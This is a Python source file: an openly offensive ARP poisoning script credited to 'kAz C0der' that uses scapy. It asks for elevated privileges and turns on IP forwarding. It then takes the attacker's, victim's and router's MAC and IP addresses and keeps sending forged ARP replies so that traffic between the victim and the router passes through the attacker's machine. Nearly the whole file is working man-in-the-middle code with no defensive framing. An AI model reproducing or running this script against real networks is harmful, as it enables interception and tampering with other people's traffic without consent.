from scapy.all import ARP
from scapy.all import *
import os,sys,time ,ctypes 
from termcolor import *
from colorama import Fore, Style


def locinfo():
    
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    print("Your local IP : {}".format(s.getsockname()[0],))
    s.close()
    
    

#--------------------Linux OS --------------------------------
#status colors
va = f"{Fore.GREEN}Ok !"
inv = f"{Fore.RED}Failed !"
su = f"{Fore.RED}sudo python3 scprit.py"
def log():
    cprint("""
        ---------------------------------   
        |   ARP Poisining Simple script |
        |           kAz C0der           |
        ---------------------------------
        |/        
           """,'blue',attrs=['bold','blink'])
if platform == "linux" or platform == "linux2":  
    if os.getuid() !=0 :
        cprint("""Need root privilege to this script""",'yellow',attrs=['bold'])
        cprint("try {}""".format(su))
    else : 
        os.system("clear")
        log()
        cprint(" root priv :: {}".format(va),'blue')
        os.system("sudo sysctl -w net.ipv4.ip_forward=1 ")
        locinfo()
        print("_______________________________\n")
        #attacker info
        cprint("Attacker info : ",'red',attrs=['bold'])
        attac_mac = input(f"{Fore.CYAN}Enter your mac address : ")
        attack_ip = input(f"{Fore.YELLOW}Enter Your local IP : ")
        print("")  

        cprint("Target info : ",'red',attrs=['bold'])  
            #target info 
        tar_mac = input(f"{Fore.CYAN}Target mac address : ")
        tar_ip = input(f"{Fore.YELLOW}Target IP address : ")
        print("")
        
        cprint("Router info : ",'red',attrs=['bold'])  
            #router info    
        rou_mac = input(f"{Fore.CYAN}router mac address : ")
        rou_ip = input(f"{Fore.YELLOW}router IP address : ")
        
        
            # target sections 
        tarp_reply = ARP(op=2,pdst=tar_ip,psrc=rou_ip,hwdst=tar_mac,hwsrc=attac_mac)       
            # router sections 
        rarp_reply = ARP(op=2,pdst=rou_ip,psrc=tar_ip,hwdst=rou_mac,hwsrc=attac_mac)
        print("-------------------------------------------------------------------------")
        cprint("Are the configuration correct ? ",'magenta')
        print(tarp_reply.show)
        print(rarp_reply.show)
        print("-------------------------------------------------------------------------")
        st_attack = input(f"Start ARP Poisoning ? {Fore.YELLOW}[ Press enter to start , No to stop ] !")
        if st_attack.lower()=="No" or st_attack.lower()=="n" : 
            sys.exit
        else :
            try :     
                while True : 
                
                    send(tarp_reply)
                    send(rarp_reply)
                    print(f"{Fore.BLUE}Status reply : {format(va)}")
                    
                    time.sleep(5)

            except InterruptedError as er : 
                cprint("Good luck  0_0",'green')
                sys.exit



#--------------------Windows OS --------------------------------
elif platform == "win32":
    
    def checkpriv():
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    if checkpriv():
        try :
            os.system("cls")
            log()
            cprint(" administaror priv :: {}".format(va),'blue')
            locinfo()
            print("_______________________________\n")
            #attacker info
            cprint("Attacker info : ",'red',attrs=['bold'])
            attac_mac = input(f"{Fore.CYAN}Enter your mac address : ")
            attack_ip = input(f"{Fore.YELLOW}Enter Your local IP : ")
            print("")  

            cprint("Target info : ",'red',attrs=['bold'])  
                #target info 
            tar_mac = input(f"{Fore.CYAN}Target mac address : ")
            tar_ip = input(f"{Fore.YELLOW}Target IP address : ")
            print("")
            
            cprint("Router info : ",'red',attrs=['bold'])  
                #router info    
            rou_mac = input(f"{Fore.CYAN}router mac address : ")
            rou_ip = input(f"{Fore.YELLOW}router IP address : ")
            
            
                # target sections 
            tarp_reply = ARP(op=2,pdst=tar_ip,psrc=rou_ip,hwdst=tar_mac,hwsrc=attac_mac)       
                # router sections 
            rarp_reply = ARP(op=2,pdst=rou_ip,psrc=tar_ip,hwdst=rou_mac,hwsrc=attac_mac)
            print("-------------------------------------------------------------------------")
            cprint("Are the configuration correct ? ",'magenta')
            print(tarp_reply.show)
            print(rarp_reply.show)
            print("-------------------------------------------------------------------------")
            st_attack = input(f"Start ARP Poisoning ? {Fore.YELLOW}[ Press enter to start , No to stop ] !")
        except KeyboardInterrupt as er : 
            cprint("Invalid input (-_-)",'red')
            checkpriv()
        except :
            cprint("Invalid input (-_-)",'red')
            checkpriv()
        if st_attack.lower()=="No" or st_attack.lower()=="n" : 
            sys.exit
        else :
            try :     
                while True : 
                
                    send(tarp_reply)
                    send(rarp_reply)
                    print(f"{Fore.BLUE}Status reply : {format(va)}")
                    
                    time.sleep(5)

            except KeyboardInterrupt as er : 
                cprint("Good luck  0_0",'green')
                sys.exit

    else :
        # Re-run the program with admin rights
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        cprint(" administaror priv :: {}".format(va),'blue')
        checkpriv()
